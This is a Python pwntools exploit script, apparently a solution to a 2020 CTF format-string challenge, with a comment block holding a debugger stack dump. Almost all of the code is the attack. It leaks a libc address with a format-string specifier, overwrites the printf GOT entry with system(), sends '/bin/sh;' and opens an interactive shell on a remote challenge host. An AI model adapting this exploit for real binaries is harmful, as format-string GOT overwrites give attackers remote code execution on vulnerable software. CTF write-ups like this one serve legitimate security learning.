#!/usr/bin/env python2
'''
    author : tripoloski
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
from fmtstr64 import *

context.update(arch="amd64", endian="little", os="linux",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/utctf2020/binex/zurk/pwnable")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = ['printf', 'sprintf', 'fprintf', 'snprintf', 'vsnprintf']
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    libc = ELF("./libc-2.23.so")
    off = 6
    print_got = 0x000000601020
    puts_plt = 0x0000000000400520
    # p = fmtstr64_payload(off{})
    # leak libc
    p = "%17$p"
    r.sendlineafter("?\n",p)
    leak = int(r.recv(14) , 16)
    log.info("leak __libc_start_main+231 : " + hex(leak))

    libc_base = ((leak - 231) - libc.symbols['__libc_start_main']) & 0xffffffff00
    libc_sys  = (libc_base + libc.symbols['system'])


    log.info("system() : " + hex(libc_sys))
    p = fmtstr64_payload(off,{print_got:(libc_sys & 0xffffffff)} , write_size="short" , write_type="partial")
    log.info("length payload : " + str(len(p)))
    r.sendline(p)
    r.sendline("/bin/sh;")

    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("binary.utctf.live", 9003)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)


# 0x7fffffffde70:	0x4242424242424242	0x70243825
# 0x7fffffffde80:	0x1	0x0
# 0x7fffffffde90:	0x7fffffffdeb0	0x400590 <_start>
# 0x7fffffffdea0:	0x7fffffffdfa0	0x4006c2 <welcome+34>
# 0x7fffffffdeb0:	0x7fffffffdec0	0x40069e <main+24>
# 0x7fffffffdec0:	0x400780 <__libc_csu_init>	0x7ffff7a05b97 <__libc_start_main+231>
# 0x7fffffffded0:	0x2000000000	0x7fffffffdfa8
# 0x7fffffffdee0:	0x100000000	0x400686 <main>
